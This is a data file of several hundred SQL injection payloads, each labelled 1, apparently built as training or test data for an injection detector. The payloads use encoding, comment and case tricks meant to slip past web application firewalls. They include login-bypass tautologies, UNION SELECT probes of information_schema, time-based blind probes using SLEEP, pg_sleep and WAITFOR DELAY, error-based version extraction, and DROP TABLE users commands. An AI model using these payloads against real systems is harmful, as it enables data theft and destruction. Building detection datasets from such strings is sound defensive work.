"1%27/**/O/*!*/R/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**/--", 1
"%27%09%09%09UN/**/ION%09%09%09SELECT%09%09%09null%2C%09%09%09null%2C%09%09%09null%09%09%09--%09%09%09", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3----pebbe3intysj", 1
"1%u0%3027/*!1234%35*/OR%u%3002%30as%63i%69(substring(%64atabase(),%u00201,%u00201))%u%3002%30>%u0020100%u0020--", 1
";SELECT%0d%0apg_sleep%28%35)%3b--/*%0d%0a%2a/", 1
"test'     OR     '1'%09= '1'     --", 1
"admin' || (1=1)'1'='1", 1
"'/**/AND/**/1=1/**/ OR (1)--/**/", 1
"%3B%25u0020SELECT%25u0020pg_sleep%285%29%3B%25u0020--%23f7vukgt5f24nf", 1
"1%27%20&&%20(1%3E%3D1)substring(database(),%201,%201)%20%3D%20%27s%27%20--#7ac1qjvai1lov", 1
"admin'/*!12345*/OR'1'='1#ycao3lvxfoba/*%0d%0a*/", 1
"%3b%20DROP%20%54ABLE%20users;%20--", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271#zr0mtz", 1
"'/*!1%32%3345*%2f|| EXISTS(%53ELECT 1 %46ROM users)--", 1
"%27 A%4eD 1=1 --", 1
"%27%20||%20(1%3E%3D1)1%3D1%20--%20", 1
"%27UNION/*%0d%0a*/SELECTnull,null,nullOR(1)--", 1
"ADmIn'					oR					'1'%09=%20'1#C88oWgHf6O", 1
"test'OR%0d%0a'1'='1'--%0a", 1
"%27%20UnioN%20seLECT%20NuLL%2C%20Null%2C%20NULl%20--%20", 1
"%27%20and%201%3D1%20--%20--jSjK4p5MnfnefD", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020----aw97ktdcc", 1
"1%u0027/*!*/ORIF(substring(database(),", 1
"1,%0a1)=%u0027a%u0027,SLEEP(5),0)--#wyu3qtqt7vhgwfi", 1
"aDMIn%27%20Or%20%271%27%3d%271%20aNd%20%27a%27%3D%27a%27", 1
"' OR 1=1  OR (1)--", 1
";SELECT/*%0d%0a*/pg_sleep(5);/*%0d%0a*/--/*%0d%0a*/", 1
"1%u0027ORIF(substring(database(),1,1)=%u0027a%u0027,SLEEP(5),", 1
"0)--", 1
"%27%20UN/**/ION%20SEL%2545%2543T%25201%2C2%2C3--", 1
"' && (1=1)1=1 --", 1
";%20%20%20%20SElecT%20%20%20%20PG_sLeEp(5);%20%20%20%20--", 1
"%31 && (1=1)1=1", 1
"admin'OR", 1
"'1'='1/*%0d%0a*/ AND 'a'='a'", 1
"' UNion SE%4cECt nuLl, n%75ll, nULl  %23%20moRe_nOI%73e--", 1
"1'%20%20%20%20OR%20%20%20%20IF(substring(database(),%20%20%20%201,%20%20%20%201)  =	'a',%20%20%20%20SLEEP(5),%20%20%20%200)%20%20%20%20 XOR 'b'='b'--", 1
"1'ORascii(substring(database(),", 1
"1,1))>%0d%0a100--", 1
"%27%20O/*!12345*/R%201%3D1%20--%20#glorgw", 1
"1%27%20uNIoN%20SElecT%20TABLe_NAMe%2C%20nulL%2C%20nuLl%20fROM%20iNFormatION_sCHeMa.TABLeS%20%20AND%20%27a%27%3D%27a%27--", 1
"WAITFOR%u%30020DEL%41Y%u0%3020%u00270:0:5%u0027/%2a*/-%2d random_n%6fise--", 1
"1%20%26%26%20%281%3D1%291%3D1%234jz772z1f7aq", 1
"test%27/*!12345*/OR%20%271%27IN%20(1)%271%27%20/*", 1
"'/**/AND 1=convert(int,@@version) OR 'b'='b'--#nfm42", 1
"1' OR%20ascii(sub%73tring%28dat%61base(), 1, 1)) >%20100 --", 1
"'/**/XOR/**/1=1/**/--/**/", 1
"'/**/unioN seLecT 1,2,3----cigjr", 1
";SEL/*!12345*/ECT/*%0a*/pg_sleep(5);--%0d%0a", 1
"'/*!*/|| 1=1  or (1)--", 1
"%27%2509%2509%2509%2509AND%2509%%32%3509%%32509%250%39extra%63tva%6cue%281%2Cconcat%%3280x5c%2Cversion%28%29%%329%29-%2d", 1
";/*!*/SELECT pg_sleep(5);  /*!*/AND 1=1--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2f*", 1
"'/**/ANd/**/extRACTVAlue(1,CONCAT(0X5c,verSIOn()))/**/OR/**/'b'='b'--", 1
"' XoR 1<=%31 %2d-", 1
"1%27||/*%0a*/IF(substring(database(),1,1)%3E%3D%27a%27,/*%0d%0a*/SLEEP(5),0)--/*%0a*/", 1
"WAITFOR%2520%2520%2520DELAY%2520%2520%2520%270%3A0%3A5%27--", 1
"%27%20UNiOn%20SEleCt%201%2C2%2c3--", 1
"1%29%2F%2A%21%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"%3B%20SEL/*!12345*/ECT%20pg_sleep%285%29%3B%20 OR (1)--", 1
";/*!*/DrOP%u0020TAbLE%u0020UsERS;%u0020--", 1
"1)%20UNIO%4e%20SELECT%201,dat%61base()%2c%33--", 1
"'oRExiSTS(SELect/*%0a*/1FrOMuSERS)--/*%0d%0a*/", 1
"1'/**/         UNION          SELECT          table_name,          null,          null          FROM          information_schema.tables          --", 1
"test' || '1'>='1' --", 1
"' || '1'='1", 1
"'      AND      extractvalue(1,concat(0x5c,version())) # more_noise--", 1
"admin'OR%0d%0a'1'='1#ehzvb0dyuj/*%0d%0a*/", 1
";SELECT", 1
"pg_sleep(5);--", 1
"%2527%2520XOR%2520extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1' AnD substrIng(DaTABasE(), 1, 1) = 'S' --", 1
";SELECT/*%0d%0a*/pg_sleep(5);/*%0d%0a*/ AND 'a'='a'--", 1
"", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--%23udpl7fe", 1
"test'%20%20%20O%52%20%20%20%271'	=%20'1%27%20%20%2%30/*", 1
"' OR '1'='1#vy1buer1mh", 1
"' and EXtraCtVAlUE(1,CONcat(0X5C,VersiON())) AND 'a'='a'--", 1
";%U0020SeLECT%u0020Pg_sLeeP(5);%U0020--", 1
"1)) UNIOn SeLecT 1,DatAbase(),3--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20--5sm2mszg", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----8jiqel", 1
"%27%20XOR%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"; SELECT p%67_s%6ceep(5); %2d-", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020  =	%u0020%u0027s%u0027%u0020--", 1
"TesT%25U0027%25U0020oR%25U0020%25U00271%25U0027%3D%25U00271%25U0027%25u0020--%25u0020", 1
"%27%20O/*!*/R%20%271%27%3D%271#j6bu8r7qqii", 1
"'  AND  1	<=	1  --", 1
"1%27%20%20%20%20%20%20%20%20%20%20OR%20%20%20%20%20%20%20%20%20%20IF%28substring%28database%28%29%2C%20%20%20%20%20%20%20%20%20%201%2C%20%20%20%20%20%20%20%20%20%201%29%2520%3D%09%27a%27%2C%20%20%20%20%20%20%20%20%20%20SLEEP%285%29%2C%20%20%20%20%20%20%20%20%20%200%29%20%20%20%20%20%20%20%20%20%20 -- random_noise--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#xie2bhxcpi42", 1
"1%25u0020aND%25u00201%3D1%20OR%20%281%29", 1
"test%u0027/*!12345*/OR%u0020%u00271%u0027LIKE%u00271%u0027%u0020/* AND 'a'='a'", 1
"1AND1=1--a9syqg47vgq2", 1
"", 1
"'uNIoNSelect%0d%0a1,2,3--", 1
"'/%2a*%2f%2f**//**//*%2a%2f/**//**/AND/*%2a//**//**//**//**//**/1	<=/**//**%2fc%6fnvert(int,@%40version)--", 1
"TEST'			oR			'1'	=	'1'			/*#y53h0e6", 1
"test'%20%20%20%20OR%20%20%20%20'1'%20=	'1'%20%20%20%20--%20%20%20%20", 1
"te%73t%%32%37%20OR%20%271%27%3%44%271%27%20--%20", 1
"1'ORascii(substring(database(),%0a1,1))>100%0aOR'b'='b'--", 1
"1%27%2F%2A%21%2A%2FOR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20%20%23%20more_noise--", 1
";%20droP%20tABLe%20useRs;%20--", 1
"'  %4f%72%20 1 =%201  --  #0umows7%51UJdvbZH", 1
"'and", 1
"1=COnvErT(InT,@@versIoN) OR 'b'='b'--%0d%0a", 1
"%u0027%u0020AND%u00201>=convert(int,@@version)--#3mx6wn44m1og", 1
"1' O%52 IF(substrin%67(database(), 1%2c 1)='a',%20SLE%45P%285), 0) --", 1
"1%27/**/OR/**/ascii(substring(databa%73e%28),/**/1,/**/1))%20%3e/**/100/**/--", 1
"tesT%27%20Or%20%271%27%3D%271%27%20%2F%2A%20%2F%2A%21%2A%2FAND%201%3D1", 1
"%27%20||%20(1%3D1)EXISTS(SELECT%201%20FROM%20users)--", 1
"'OR", 1
"'1'='1/*%0a*/ OR (1)", 1
"%27%20Un/**/Ion%20SelECT%20NULL%2c%20nuLl%2c%20NULl%20--%20", 1
"%u0027%u0020AND%u00201=convert(int,@@version) OR 'b'='b'----k45ixkh", 1
"%u0027		Or		1%09=/**/1		--", 1
"test%u0027%u0020OR%u0020%u00271%u0027<=%u00271%u0027%u0020--%u0020--c6u5t3sl9v9", 1
"1))%u0020UnIon%u0020SeleCT%u00201,DatAbase(),3--", 1
"' XOR '1'='1--07f8mpiws8j4", 1
"; SELECT pg_sleep(5);  AND 'a'='a'--", 1
"1%29%29%2F%2A%21%2A%2FUNIO%4e%%32%30SELECT%2%301%2C%64atab%61se%28%29%2C3--", 1
"'/**/||/**/EXISTS(SELECT/**/1/**/FROM/**/users)--", 1
"%u0027UNIONSELECT%0anull,null,null--%0d%0a", 1
"test'		OR		'1'/*!12345*/=%20'1'		/*", 1
"WAITFOR		DELAY		'0:0:5'--", 1
"TESt' or '1'='1' --", 1
"%27%20aND%201%3D1%20--%20%23uEXzrVVg4", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F%20%23%20more_noise--", 1
"' || 1=1 -- --5pk0wgma5toz", 1
"' OR '1' =%20'1", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----uftuv2i25", 1
"'/*!*/OR %271'='%31", 1
"'		UNION		SELECT		1,2,3/*!*/# more_noise--#e35jc0vm1", 1
"%27%20OR%201%3D1%20--%20--k2p87gngq", 1
"WA%49TFOR/*!*/DELAY%20'0%3a0:5'--", 1
"%27%20AND%201%3D1%20--%20--f4l727ev4ci6i6", 1
"' && (1=1)%31=1 -%2d", 1
"WAiTFOr%20%20%20%20%20DeLAY%20%20%20%20%20'0:0:5'----2G4UEQrk96", 1
"1%27%20oR%20IF%28sUbstRInG%28daTabASE%28%29%2C%201%2c%201%29%3D%27A%27%2C%20sLeEp%285%29%2C%200%29%20--", 1
"WAITFOR%20DELAY%20%270%%33A0%3A5%%327-%2d", 1
"1%27 %20  && %20  (1  %3d  1)s%75bstring(%64atabase(),    1,  %20 1)    %20 =   %20  's'    --#ea55ja4i", 1
"%27%%320OR%201%3D1%%320--%20", 1
"'/**/AND 1=convert(int,@@version)--", 1
"aDmin%27%20or%20%271%27%3D%271", 1
"'/**%2fAND/**/extractv%61lue%281,c%6fncat(0x5c,ver%73ion%28)))----p%76ujs6h6", 1
"%27 || (1=1)1=1 %2d-", 1
"' aNd exTrACtVAlUE(1,CoNcAT(0X5c,Version()))--", 1
"1)%09%09UniOn%09%09SELecT%09%091,DAtABaSe(),3 -- RandOm_noise--", 1
"%27%20and%201%3D1%20--%20", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29--%23dd46fyv6pt", 1
"a%64min'/*%2a/||/**%2f'1'='1", 1
"%27%20%2541nD%201%253d1%20--%20", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  OR (1)----1d5ugf82", 1
"1 AND 1=1#3jv5x3v", 1
"%3B%20dROp%20tAbLE%20uSErS%3B%20--", 1
"'  OR  EXISTS(SELECT  1  FROM  users)  /*!*/AND  1%09>=%091--", 1
"1%U0020anD%u00201=1#i82h0wgtem", 1
"admin'%09%09%09%09OR%09%09%09%09'1' >=  '1 # more_noise", 1
"1%u0027%20%20%20%20%20OR%20%20%20%20%20ascii(substring(database(),%20%20%20%20%201,%20%20%20%20%201))%20%20%20%20%20>%20%20%20%20%20100%20%20%20%20%20--", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020#dc6swwlq6uht0", 1
"WAIT%46OR%20DELAY%20%270%3A%30%3A5%27-%2d -- random_noise", 1
"%u0027%20AND%u00201=con%76ert(int%2c@@version%29--", 1
"'/**/AnD/**/eXtRactvA%6cUE%281,%63O%6eC%61t(0X5c,VersIon()))--", 1
"waITfor%u0020dELAy%u0020%u00270:0:5%u0027--", 1
"1%27%%320%26%2%36%20substr%69ng%28datab%61se%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--%23drld%6csck%32oe%74%6e17", 1
"1 A%4eD 1=1", 1
"admi%6e' || '1'='1%23zfla%69cih%72vguib", 1
"'/*!*/AND 1=convert(int,@@version)--", 1
"'/**/unIoNSeLect/*%0d%0a*/1,2,3--random_noise--", 1
"test%25U0027%25U0020Or%25U0020%25U00271%25u0027%3d%25u00271%25U0027%25U0020%2f%2a", 1
"admin%u0027OR/*%0a*/%u00271%u0027=%u00271%0a", 1
"%27UNIONSELECT", 1
"null,null,null%0a%20AND%20%27a%27%3D%27a%27--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020/*/*!*/--random_noise/*%0d%0a*/", 1
"test' OR '1'LIKE'1' --", 1
";%20DROp%20taBlE%20UsERS;%20%20#%20more_noise----koyq2", 1
"' aND 1<=1 --", 1
"'					UNION					SELECT					1,2,3--", 1
"1'  UNION  SELECT  table_name,  null,  null  FROM  information_schema.tables  --#glv1g7pxvjh", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29    AND    'a' = 'a'--", 1
"%2527AND%0A1%2520%253D%2520convert%28int%2C%40%40version%29--%2F%2A%250a%2A%2F", 1
"adm%69n'%20O/*!*/R%09%09'1'	=%20'1", 1
"' or '1'iN (1)'1", 1
"'/**/UN/**/ION/**/SELECT/**/1,2,3--#7gustqf0p6", 1
"1%u0020AND%u00201%3D1", 1
"1' AND substring(database(), 1, 1) = 's' --#5yt5gg4ojvc", 1
"%27%2F%2A%2A%2FAN%2544%201%3D1%20%252d-%20", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2FIF%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%20%3D%2520%27a%27%2C%2F%2A%2A%2FSLEEP%285%29%2C%2F%2A%2A%2F0%29%2F%2A%2A%2F--", 1
"1' unION sELECt TABlE_nAme, NUlL, Null FROm inFORmAtIoN_SCHemA.TAblEs  -- random_noise----r1bifrsbkc", 1
"1%u0%3027%%750020OR%u0%3020IF%28substring(d%61ta%62ase(),%u%300201,%%7500201)=%u0027a%u0027,%u002%30SL%45EP(5),%u00200)%u0020--", 1
"'/*!*/AND%201 =%201%20 OR 'b'='b'--%20#m6rrpvz", 1
"%U0027%U0020OR%U00201=1%u0020 /*!*/AND 1=1--%u0020", 1
"TeST'/**/Or/**/'1'='1'/**//*", 1
"%74est%2%37%2%30OR%20%271%%327%3D%271%27%20--%20#lgpnwdrtiu", 1
";/**/DrOp/**/TABlE/**/uSeRS;/**/--", 1
";          SELECT          pg_sleep(5);          --#jkm5f926yp", 1
"1%u0027OR%0aIF(substr%69ng(d%61tabase(%29,1,", 1
"1)=%u0027%61%u0027,SLEEP(5%29,/%2a%0d%0a%2a/0)--#cpfzm", 1
"1%U0027%U0020Or%u0020ascIi(su%62STrIng(%64%61%74a%62AS%65(),%U00201,%U00201))%U0020%3e%U0020100%U%3002%30%2d-", 1
"1'ORIF(substring(database(),", 1
"1,1)>='a',SLEEP(5),0)----rgzwhm1w0", 1
"test%27OR/*%0a*/%271%27%3D%271%27--/*%0d%0a*/", 1
"'/*!12345*/OR%20EXIST%53(SELECT 1 FROM%20user%73)--", 1
"%31))%20U%4eION%09SELECT%091,database(),3%2d-", 1
"'AND1=convert(int,@@version)--/*%0d%0a*/", 1
";%20se%4cECt%2%30pg_SLEep(5%29%3B%20 %23 mOrE_noiSE--", 1
"WaiTFOR/**//**//**//**/dElAY/**//**//**//**/'0:0:5'----WR9qguS2", 1
"'%20%20%20%20%20UN/*!12345*/ION%20%20%20%20%20SELECT%20%20%20%20%20null,%20%20%20%20%20null,%20%20%20%20%20null%20%20%20%20%20--%20%20%20%20%20", 1
"'/**/OR/**/1=1/**%2f%2d%2d/**/", 1
"%27%20%20%20AND%20%20%201%2520%3D%20convert%28int%2C%40%40version%29--", 1
"1%29%2F%2A%2A%2FUN/*!*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2Cdatabase%28%29%2C3--", 1
";	DROP	TABLE	users;	--", 1
"'/**/UniOn seLECt NulL, Null, nulL --", 1
"1)%20UNION%20SELECT%201,database(),3--#36jze0z", 1
"test'OR", 1
"'1'LIKE'1'%0a/*/*%0d%0a*/", 1
"1) UNION SELECT 1,database(),3 # more_noise--#1sttq", 1
";%09%09%09SELECT%09%09%09pg_sleep(5);%09%09%09----o4kycss", 1
"1%u0020%41ND%u00201=1", 1
"WA%49%54FO%52 DELAY '0:0:5'--", 1
"1%u0020&&%u00201=1 OR (1)", 1
"' anD 1>=cOnVeRT(iNT,@@VerSIon)--", 1
"'		AND		1%09=	1		--", 1
"%27%2F%2A%21%2A%2F%20%20%20%20XOR%20%20%20%20%201%09%3D%2509convert%28int%2C%40%40version%29--", 1
"admin%27OR%271%27%3E%3D%271%250d%250a", 1
"1%2F%2A%2112345%2A%2FAND%201%3D1%235m0r2rc4sc8gntx", 1
"tEst%27%20Or%20%271%27%3D%271%27%20/*", 1
"1%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2Fascii%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise--", 1
"1/**/AND/*%2a/%31=1", 1
"test' OR '1'='1' /*--j1psfac89o", 1
"' oR %31=%31 --", 1
"' XOR extractvalue(1,concat(0x5c,version())) /*!*/AND 1=1--", 1
"' OR exIStS(SelE%43T%201 FRO%4D US%65Rs)--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#s43prro", 1
"%u0027/**/OR/**/1=1/**/--/**/#7407w0swe", 1
"1)%20%20UNION%20%20SELECT%20%201,database(),3/*!*/AND%0a1=1--/*%0a*/", 1
"%u0027%u0020A/*!12345*/ND%u00201=convert(int,@@version)----6eblb6", 1
"%3b%25U0020drOp%25u0020TablE%25u0020UsErs%3b%25U0020--", 1
"a%64m%69n' OR '1'='1", 1
"'/**/unIoN/**/sElECt/**/1,2,3--", 1
"1))%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u00201,database(),3--", 1
"1)/**/UNION%20SELECT%201,database(),3----wgmu3z6ln353ku6", 1
"test'OR%0a'1'='1'/* -- random_noise--jxl18w6", 1
"%u0027OR", 1
"EXISTS(SELECT1FROMusers)%20AND%20%27a%27%3D%27a%27--/*%0d%0a*/", 1
"ADmin' || (1>=1)'1'='1#aeferk", 1
"test%27%20OR%%32%30%27%31%27%3D%271%27%20%2d-%20", 1
";/**/  DROP   TABLE   users;   --", 1
"1/*!*/AND1=1/*%0d%0a*/", 1
"; Drop %54aBlE U%73e%72S; --", 1
"%u0027/**/OR%u0020%u00271%u0027IN%u0020(1)%u00271", 1
"1'/*!12345*/or/**/IF(SUbStriNG(DaTabASe(),/**/1,/**/1)='a',/**/sLEeP(5),/**/0)/**/--", 1
"'/*!12345*/UNION SELECT null, null, null  OR 'b'='b'--", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20 OR (1)--", 1
"'UNIONSELECTnull,null,%0anull--random_noise--%0d%0a", 1
"%u0027%U0020uNIoN%U0020SEleCt%u00201,2,3----svWNz5", 1
"1%%327%2509%2509%2509OR%250%39%2%35%309%%32509ascii%28substring%28database%28%29%%32%43%25%309%2509%25091%2C%%32%35%309%2509%%325091%29%29%2509%2509%2509%3E%2509%2509%2%3509100%2509%25%309%2509--", 1
"%27%20%20OR%20%20%271%27%20%20%3D%20%271", 1
"%27AND1%3D1--%2F%2A%250d%250a%2A%2F", 1
"%u0027/**/UNION%u0020SELECT%u00201,2,3 AND 'a'<='a'--", 1
"'AND", 1
"extractvalue(1,concat(0x5c,version()))--", 1
"' UNiON sELeCT NuLl, NULL, Null --", 1
"%u0027%u0020UNION%u0020sELect%u0020nuLl,%u0020NULL,%u0020nuLl%u0020%u0020OR%u0020(1)--%u0020#34lpz189igqm99f", 1
"%3B%20S%45LECT%20pg%5fsleep%285%2%39%3B%2%30--", 1
"test'/**/||/**/(1=1)'1'='1'/**//*#zs41rl94cgm", 1
"%27ANd%0d%0aExTRACTValu%65(%31,cONCAT(0X5c,vERsiON%28%29))----f%54%44443tiBft/*%0d%0a*/", 1
"1%u0027/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/----kjfetvkpb", 1
"TeST%27%20OR%20%271%27%3d%271%27%20--%20--f8tm0vesl77qt", 1
"tEst'   || (1=1)  '1'%09=%20'1'   /*", 1
"test%27OR/*%0d%0a*/%271%27%3D%271%27%0d%0a/*", 1
"1'%09%09%09%09AND%09%09%09%09substring(database(),%09%09%09%091,%09%09%09%091)%09%09%09%09	=	%09%09%09%09's'%09%09%09%09--", 1
"%27/*!*/aND%20ExtRACTVALUE(1,COnCaT(0X5C,veRSiOn()))--", 1
"teST%27%20OR%20%271%27%3D%271%27%20/*%20or%20%27b%27%3d%27B%27", 1
"' or '1'in (1)'1 /*!*/and 1=1", 1
"1%27%20OR%20IF(s%75bst%72ing%28databa%73e()%2c%201,%201)%3D%27a%27,%20%53LEEP(5),%200)%20%2d-#prbludaxg5", 1
"1A/*!12345*/ND1=%31/*%0a*/", 1
"; SELE%43T pg_s%6ceep(5%29; --", 1
"1%27%20O%52%20ascii(sub%73tring(%64atabase(%29,%201,%%3201))%20%3E%20100%20%2d-", 1
"1/**/A/*!*/ND/**/1=1", 1
"%3B%20DROP%20TABLE%20users%3B%20--#dzck6uz5q", 1
"%2527%2520UNION%2520SELECT%25201%2C2%2C3--%231s0o5j7", 1
"%27%20OR%201%3D1%20--%20#v6s9y", 1
";%09%09%09%09SELECT%09%09%09%09pg_sleep(5);%09%09%09%09--", 1
"1%20AND 1=1", 1
"' %20   UNI%4fN    %20%53ELEC%54     nul%6c,     null,     %6eull     --", 1
";%u0020sELecT%u0020pg_SLEep(5);%u0020--", 1
"%31%u0027/*%2a/UN%49ON/**/SELECT/**/table_name,/**/null,/%2a*/n%75ll/**/F%52OM/**%2fin%66ormatio%6e_schema.ta%62les/**/--", 1
"1%2f**/aND%201%3%441", 1
"1))uniOn%0aSeLeCt", 1
"1,dAtabaSe(),3--%0a", 1
"; Select pG_sLEeP(5); --", 1
"'/*!*/AND     extractvalue(1,concat(0x5c,version()))--", 1
"%27/*!*/OR%201%3D1%20--%20#iixgn6", 1
"test%%327%20OR%%320%271%27%3D%271%27%20/*-%2do0%7anjz5wp%35jhvu", 1
"' ANd 1=conveRT(Int,@@VERsIon)--", 1
"%61dmin%27OR%0a'1'%3d'1/*%0d%0a*/", 1
"test%27%20OR%20%271%27%3D%271%27%20 OR (1)--%20--xlv071noqkvyhia", 1
"%27%20Or%20%271%27%3D%271", 1
";SELECT%0apg_sleep(5);--", 1
"admin'||%0a'1'='1OR(1)", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)  = %u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"%31%27%09%09%09%0%39%09UNION%0%39%09%09%0%39%09SELECT%%309%0%39%09%09%09ta%62le_name,%09%09%09%09%09null,%09%09%09%09%0%39nul%6c%09%09%09%09%09FROM%09%09%09%09%0%39information_sc%68e%6da.table%73%09%09%%309%0%39%09--", 1
"admin'/**/XOR '1'='1", 1
"1%u0027%u0020uniOn%u0020selECT%u0020tABLe_nAMe,%u0020NULl,%u0020nulL%u0020fRom%u0020inFORMaTIon_SchEma.taBlEs%u0020--", 1
"1%20AND%201%3d1", 1
";SeleCt/*%0%61*/Pg_Sl%65EP(5);%0%64%0a--%0a", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%20%20%20%20%20--%20%20%20%20%20random_noise--%u0020#nc3i8oiyd48tio", 1
"wAItFOr%20dElAy%20%270:0:5%27--", 1
"' oR '1'>='1", 1
"' UniOn SelECT NUll, nuLl, nULl --", 1
"1) U%4eION S%45LEC%54%201,database(),3--", 1
"1'/*!12345*/UniOn SElECt taBLe_namE, NULL, NULl frOM inFoRmAtIoN_sCheMA.tAbleS --", 1
"'		UNION		SELECT		null,		null,		null		--", 1
"1/**/AND/**/1=1--21elhzdfya6hxq", 1
"'OR'1'='1/*!*/AND%0a1=1", 1
"1%u0020AND%u00201%09=%091", 1
"1%41ND/*%0d%0a*/1=1", 1
"", 1
"test%27OR%0d%0a%271%27%3D%271%27%0d%0a/*", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#5602iyw4tt2", 1
"1AND", 1
"1  =  1%2f*%0d%0%61*/", 1
"' OR '1'='1--yiwu3e1l5", 1
"1)/**//**//**//**/unIOn/**//**//**//**/SELEcT/**//**//**//**/1,DatABAsE(),3----yxckdoe5k3v1", 1
"' || 1=1%20-%2d", 1
"'%09%09%09%09UNioN%09%09%09%09selEcT%09%09%09%091,2,3--", 1
";/**/DR%4fP TA%42LE %75sers; --", 1
"1%27%20or%20ascIi(SuBStRInG(dAtABAsE(),%201,%201))%20%3E%20100%20 -- random_noise--", 1
"'        AND        extractvalue(1,concat(0x5c,version()))        OR        'b' =	'b'--", 1
"1)/**/UNiON/**/selECT/**/1,dAtABaSE(),3--", 1
"1)  %55NIO%4e  %53ELECT  1,da%74abase(),3--", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),/*%0d%0a*/0)--", 1
"%27%20UN/*!*/ION%20SELECT%201,2,3--", 1
"%27%20uN/*!*/ion%20SelECt%201%2c2%2c3--", 1
"test' || '1'='1' -- #4xn8rs", 1
"1%27%2F%2A%2A%2F%26%26%20%281IN%20%281%291%29substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"'/**/AND/**/1=convert(int,@@version) AND 'a'='a'--", 1
"%27%09OR%09%271%27%3C%20%20%3D%09%271", 1
"1 && 1=1 || (1)#qiac40l4xpo6", 1
"1' UNi%4f%4e SelECT tABle_NA%4dE, NU%6cl, NUlL fRO%4d I%4eFOrMatiON_SchEMA%2etaBl%65S --", 1
"1%27%20OR%20if%28sUbSTRinG%28dAtAbASe%28%29%2c%201%2c%201%29%3d%27a%27%2C%20SLeep%285%29%2c%200%29%20--", 1
"1' OR ascii%28substring%28dat%61b%61se(), 1, 1)) > 100%20--", 1
"1%27%20OR%20IF%28substring%28%64atabase%28%29%2C%20%31%2C%201%29%3D%27%61%27%2%43%20%53L%45EP%28%35%29%2C%2%30%30%29%20--", 1
"WAITFOR DELAY '0:0:5'----sh6j1", 1
"%27%20UNION%20SELEC%54%201,2%2c3%2d-", 1
"1%u0027%20%20%20UNION%20%20%20SELECT%20%20%20table_name,%20%20%20null,%20%20%20null%20%20%20FROM%20%20%20information_schema.tables%20%20%20----i7jrwd", 1
"%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%20OR%20%27b%27%3D%27b%27", 1
";DROPTABLEusers;/*%0d%0a*/--", 1
"admin'/**/OR/**/'1'IN/**/(1)'1", 1
"%61dmin%u0027/**/%4fR/**/%u00271%u0027=%u00271", 1
"'%20%20%20%%320%20AND%20%20%20%20%201", 1
"%3d	conver%74(in%74,@@%76e%72sion)--%0a", 1
"'AND/*%0d%0a*/1=%63onver%74(int,@@vers%69%6fn)--#1xu8ff4%6anf", 1
"", 1
"%27%20&&%20extractvalue(1,concat(0x5c,version()))--#e9f3rrj", 1
"1) UNiON SelECT 1,datAbAse(),3 And 'a'='A'--#bT66w2ny", 1
";/**/SEL/*!12345*/ECT/**/pg_sleep(5);/**/--", 1
"; DrOp tabLE users; --", 1
"'/*!1%32345*/AND %31=convert(int,%40@version%29%2d-", 1
";%20SELECT%20pg_sleep(5);%20--#06myy0", 1
"%27%20OR%20%25271%27%253d%271", 1
"test'OR%0d%0a'1'='1'--%0a--t3xy57pmt", 1
"1%20%20AND%20%201%09=%091", 1
"'/**/||/**/1=1/**/--/**/", 1
"' aND 1=1  # mOre_NOISe--", 1
"%27%20UNIO%254e%20%2553ELECT%201%252c2%2C3--", 1
"%27%20||%20%271%27%3D%271--lygqvuh", 1
"test'/**/OR '1'='1' /*--pckog68lk", 1
"%u0027/**/UN/*!12345*/ION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"%%32%37%2%30OR%20EXI%53TS(S%45LECT%201%20FROM%20users)--", 1
"%27/**/OR%201%3D1%20--%20", 1
"admin%27%%320OR%20%271%27%3D%271%%32%30OR%20%27b%%32%37%3D%27b%27", 1
